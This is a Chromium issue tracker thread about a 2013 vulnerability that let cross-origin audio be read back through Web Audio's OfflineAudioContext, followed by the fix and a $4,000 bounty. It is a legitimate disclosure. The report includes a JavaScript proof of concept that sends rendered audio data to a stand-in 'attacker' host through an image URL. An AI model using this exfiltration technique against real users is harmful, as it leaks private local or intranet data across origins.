# Security: Cross-origin information disclosure through createMediaElementSource and OfflineAudioContext

| Field | Value |
|-------|-------|
| **Issue ID** | [40078322](https://issues.chromium.org/issues/40078322) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Media |
| **Reporter** | am...@gmail.com |
| **Assignee** | rt...@chromium.org |
| **Created** | 2013-10-31 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

An attacker may read an audio file (or a conversion of that file to an audio buffer), overriding cross origin checks.  

This, for example, may allow sending to the attacker the contents of a file stored on the local machine or on the intranet to a remote computer.

**VERSION**  

Chrome Version: [30.0.1599.114 stable, 30.0.1599.101 m]  

Operating System: [Linux - Ubuntu 12.10 64bit, Windows 7 (VM)]

**REPRODUCTION CASE**  

To reproduce with javascript:

1. Create an audio element
2. Set its source to a media file on a different origin (i.e. different domain) than the executing file.
3. Create a webkitOfflineAudioContext (context)
4. on the context, call createMediaElementSource of the audio element, creating a source node
5. connect the source node to the context.destination
6. play the audio and start rendering the context
7. when rendering is done, send the rendered output buffer to the attacker.

A similar vulnerability can be achieved by using webKitAudioContext and a scriptProccessor node to collect the data from the MediaElementAudioSource node.

Did not find (or looked for) a way to escalate this vulnerability beyond valid media files.

Following is a javascript reproduction of this. Change the src to a valid audio file src.  

// =========== Start script  

var src = '<http://192.168.1.83:8001/webaudio/resources/sin_440Hz_-6dBFS_1s.wav>';  

var sampleRate = 44100.0;  

var lengthInSeconds = 2;

var context = null, audio = null, source = null;  

var actualBuffer = null;

context = new webkitOfflineAudioContext(2, sampleRate \* lengthInSeconds, sampleRate);  

var audio = document.createElement('audio');  

audio.src = src;  

var source = context.createMediaElementSource(audio);  

source.connect(context.destination);

audio.addEventListener("playing", function(e) {  

console.log("playing", e);  

context.startRendering();  

});

context.oncomplete = function(e) {  

console.log(e.renderedBuffer);  

// Just a demonstration of sending the data, sending the second sample  

var img = document.createElement('img');  

img.src = '<http://attacker/collectData?=>' + e.renderedBuffer.getChannelData(0)[1];  

document.body.appendChild(img);  

}

audio.play();

// ================= End script

## Timeline

### ts...@chromium.org (2013-11-01)

Repro'd on chrome 32 linux. A quick read of http://www.w3.org/TR/webaudio/ didn't turn up spec'd origin-related behaviour for createMediaElementSource(). This does seem like an major omission in the spec, since prior to the introduction of this feature, the data would have had to have been retrieved via XHR and subject to its restrictions.

Assigning to kbr@ per webaudio/OWNERS. We can fix the bug, but the spec needs to be fixed as well.




### kb...@chromium.org (2013-11-01)

[Empty comment from Monorail migration]

### jw...@chromium.org (2013-11-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-01)

Wrong label - Security_Impact-None. c#0 says it impacts stable.

### cl...@chromium.org (2013-11-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-01)

Fixing bug priority based on security_severity-* and releaseblock-* labels.

### kb...@chromium.org (2013-11-01)

Regarding changes to the Web Audio Spec: it's fine for Web Audio to play cross-origin media. It's just not okay to allow readback of that data via OfflineAudioContext. I think the only mechanism that's needed is to detect whether a cross-origin source is connected to a graph whose destination is an OfflineAudioContext, or vice versa, and to throw an exception at that point to prevent the operation.


### am...@gmail.com (2013-11-01)

Another mechanism that a similar information disclosure is available with is the a ScriptProcessor node (through AudioContext or OfflineAudioContext) as I wrote in https://crbug.com/chromium/313939#c0. 
AnalyzerNode may disclose some information as well, but I don't know if cross origin should be prevented.

### am...@gmail.com (2013-11-01)

* AnalyserNode that is.

### cl...@chromium.org (2013-11-01)

Adding area label based on an intelligent guess!

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-11-01)

Adding area label based on an intelligent guess!

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-11-10)

[Comment Deleted]

### cl...@chromium.org (2013-11-13)

Migrating old milestone labels.

### cl...@chromium.org (2013-11-18)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!)

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### rt...@chromium.org (2013-11-19)

I think I know how to solve this. Can someone provide a pointer if there's a function in Blink to determine if the origins are the same?

### ts...@chromium.org (2013-11-19)

@rtoy - SecurityOrigin::canAccess().

### cl...@chromium.org (2013-11-28)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-12-07)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-12-15)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-12-23)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-01-01)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-01-09)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-01-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-01-17)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-01-26)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-02-03)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-02-12)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-02-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-20)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-01)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-09)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-17)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-26)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-03-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-04-03)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-12)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-20)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-04-28)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### rt...@chromium.org (2014-04-29)

+cwilso

### cl...@chromium.org (2014-05-13)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-05-22)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-05-30)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-06-07)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-06-16)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-06-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-24)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-07-03)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### mb...@chromium.org (2014-07-08)

Have you had a chance to look at this, rtoy? This bug has been open for a long while without much activity.

### cl...@chromium.org (2014-07-11)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-07-20)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-07-28)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### me...@chromium.org (2014-08-07)

rtoy: Any updates?

### cl...@chromium.org (2014-08-09)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### rt...@chromium.org (2014-08-12)

Working on refactoring AudioContext to support this.

### cl...@chromium.org (2014-08-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-09-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-08)

[Empty comment from Monorail migration]

### me...@chromium.org (2014-11-11)

rtoy: Is the refactoring work for AudioContext finished? Can you provide another update? Thanks.

### in...@chromium.org (2015-01-07)

What is status on the refactoring work ? If WIP, please readd WIP label.

### in...@chromium.org (2015-01-07)

No more M39 patches, moving to M40.

### cl...@chromium.org (2015-01-07)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 147 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ri...@chromium.org (2015-01-22)

Hi, would you mind giving an update on the progress on this bug?

### cl...@chromium.org (2015-01-29)

rtoy@: Uh oh! This issue is still open and hasn't been updated in the last 168 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### bu...@chromium.org (2015-02-04)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189527

------------------------------------------------------------------
r189527 | rtoy@chromium.org | 2015-02-04T20:29:09.909610Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-allowed.html?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio/compatibility.js?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio/media-element-cross-origin-allow.php?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-same-origin.html?r1=189527&r2=189526&pathrev=189527
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/MediaElementAudioSourceNode.cpp?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-allowed-expected.txt?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin.html?r1=189527&r2=189526&pathrev=189527
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/AudioContext.cpp?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-with-credentials.html?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-same-origin-expected.txt?r1=189527&r2=189526&pathrev=189527
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/AudioContext.h?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio/js-test.js?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-expected.txt?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio/laughter.wav?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-with-credentials-expected.txt?r1=189527&r2=189526&pathrev=189527
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/resources/webaudio/media-element-audio-source-node-test.js?r1=189527&r2=189526&pathrev=189527

Output silence if the MediaElementAudioSourceNode has a different origin

See http://webaudio.github.io/web-audio-api/#security-with-mediaelementaudiosourcenode-and-cross-origin-resources

Two new tests added for the same origin and a cross origin source.

BUG=313939

Review URL: https://codereview.chromium.org/520433002
-----------------------------------------------------------------

### js...@chromium.org (2015-02-07)

Can this be marked fixed?

### ti...@google.com (2015-02-11)

hey rtoy@ - please advise whether we can mark this as fixed. From the patchset it looks like it's good to go, but grateful for your confirmation.

### rt...@chromium.org (2015-02-11)

Sorry, it got reverted on Friday because it was causing lots of crashes because I forgot to check a condition.  I have a fix for that and will try to land it tomorrow.  

### ti...@google.com (2015-02-11)

Cool - thanks for the update.

### ti...@google.com (2015-02-17)

rtoy@ - checking in here. When can you land for your fix from #67?

### bu...@chromium.org (2015-02-17)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=190367

------------------------------------------------------------------
r190367 | rtoy@chromium.org | 2015-02-17T23:49:51.787580Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-with-credentials.html?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-allowed.html?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-same-origin-expected.txt?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-expected.txt?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-same-origin.html?r1=190367&r2=190366&pathrev=190367
   M http://src.chromium.org/viewvc/blink/trunk/Source/modules/webaudio/MediaElementAudioSourceNode.cpp?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-with-credentials-expected.txt?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin-allowed-expected.txt?r1=190367&r2=190366&pathrev=190367
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/media-element-audio-source-node-cross-origin.html?r1=190367&r2=190366&pathrev=190367

Check for valid webMediaPlayer() before using it.

This fixes the underlying issue in https://crbug.com/chromium/456312 and reverts the revert in
https://codereview.chromium.org/905023002, adding the fix and the layout tests back.

Manually tested by visiting youtube.com and clicking on videos, before the current video is finished. This requires the Audio EQ (HTML5 Audio Equalizer for Chrome) extension to be added and enabled.

BUG=456312, 313939

Review URL: https://codereview.chromium.org/905393002
-----------------------------------------------------------------

### me...@chromium.org (2015-02-18)

rtoy@: Is there any work remaining? Can we close this issue as fixed now? 

### me...@chromium.org (2015-02-18)

[Empty comment from Monorail migration]

### rt...@chromium.org (2015-02-18)

#70 has the fix that we want. I think this is done now.

### ti...@google.com (2015-02-18)

Thanks!

### cl...@chromium.org (2015-02-19)

[Empty comment from Monorail migration]

### ti...@google.com (2015-03-16)

Based on revision number in #70 (190367), this is already in M42 and it doesn't make the threshold for a patch to M41.

### ti...@google.com (2015-04-14)

Congratulations - $4000 reward for this report.

Notes from panel: Textbook infoleak with great reproduction steps.

Someone from our finance area should be in touch within the next two weeks to arrange payment. If you haven't heard from anyone by then, please contact me directly.

You'll be credit in our release notes as amitayd. Please let me know if you'd like to use another name.

Thanks,
Tim

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### am...@gmail.com (2015-04-14)

Thank you, great surprise this morning!

You can credit me in the release notes as Amitay Dobo.

Thanks for doing a great job on Chromium,
Amitay

### am...@gmail.com (2015-04-28)

Sorry for polluting the issue with administration, but couldn't reveal timwil...@gmail.com full email using the captcha and contact you directly.

I wasn't contacted yet by anyone from finance yet, please contact me or let someone contact me.

Best,
Amitay Dobo ( amitayd@gmail.com )

### ti...@chromium.org (2015-04-28)

Emailed Amitay.

### ti...@google.com (2015-05-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-05-28)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/313939?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078322)*
